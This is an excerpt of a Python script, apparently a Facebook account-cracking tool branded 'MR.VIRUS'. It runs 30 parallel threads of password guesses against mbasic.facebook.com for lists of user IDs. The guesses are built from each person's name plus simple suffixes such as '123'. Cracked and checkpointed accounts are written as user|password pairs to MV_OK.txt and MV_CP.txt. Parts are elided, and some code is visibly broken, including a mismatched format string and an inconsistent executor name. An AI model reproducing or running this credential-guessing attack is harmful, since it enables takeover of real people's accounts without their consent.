...
from concurrent.futures import ThreadPoolExecutor as virusMV
...
\033[1;93m __  __ ______     _____ ____  _   _ ____
\033[1;91m |  \/  |  _ \ \   / /_ _|  _ \| | | / ___|
\033[1;92m | |\/| | |_) \ \ / / | || |_) | | | \___ ®
\033[1;93m | |  | |  _ < \ V /  | ||  _ <| |_| |___) |
\033[1;91m |_|  |_|_| \_(_)_/  |___|_| \_\\___/|____/


\x1b[1;97m------------------------\x1b[1;97m------------------------
\033[1;31m\033[1;92m Author \x1b[1;97m : \033[1;92m           MR.VIRUS
\033[1;31m\033[1;92m Facebook\x1b[1;97m:  \033[1;92m          Md. Ashraful Islam
\033[1;31m\033[1;92m GitHub\x1b[1;97m  : \033[1;92m           DarkHunter420
...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mMV_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mMV_CP.txt' % (H, P, str(len(cp))))
	    input("\x1b[1;97mPress enter to back virus Menu ")
	    Virus()
...
def virus():
    ...
    print(' [E] exit ')
    print('')
    _virus___ = input(' [?] Choose option : ')
    if _virus___ in ('1', '01'):
        __xxx__().virusx(id)
    if _virus___ in ('2', '02'):
        create_file()
    if _virus___ in ('E', 'ee'):
        pass
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;97m[MV] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [MV-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('MV_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s [MV-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('MV_CP.txt' , 'a').write('%s\n' % wrt)
                        break
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            print(47*"-")
            with VirusMV(max_workers=30) as MVworld:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        ...
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            ...
                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
                        MVworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        elif chi in ('2', '02'):
